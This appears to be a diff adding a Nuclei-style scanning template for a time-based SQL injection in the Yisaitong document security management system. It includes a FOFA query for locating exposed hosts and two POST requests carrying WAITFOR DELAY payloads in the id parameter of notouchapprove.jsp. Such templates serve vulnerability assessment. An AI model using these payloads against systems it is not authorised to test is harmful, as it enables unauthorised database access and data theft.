@@ -1,0 +1,29 @@
+id: yisaitong-dms-notouchapprove-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 notouchapprove.jsp 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
+          亿赛通电子文档安全管理系统在notouchapprove.jsp接口中存在SQL注入漏洞。攻击者可通过构造恶意POST请求，利用id参数中的SQL注入点执行任意SQL语句。通过注入WAITFOR DELAY指令，攻击者可验证漏洞存在性并引发数据库响应延迟。该漏洞可能导致未经授权的数据库操作，包括敏感数据泄露、数据篡改或删除，严重威胁系统安全性和数据完整性。
+  tags: 亿赛通电子文档安全管理系统
+http:
+- raw:
+  - |
+    POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1'WAITFOR+DELAY'0%3a0%3a5'--
+  - |
+    POST /CDGServer3/client/notouchapprove.jsp;Servicelogin HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    id=1'WAITFOR+DELAY'0%3a0%3a8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
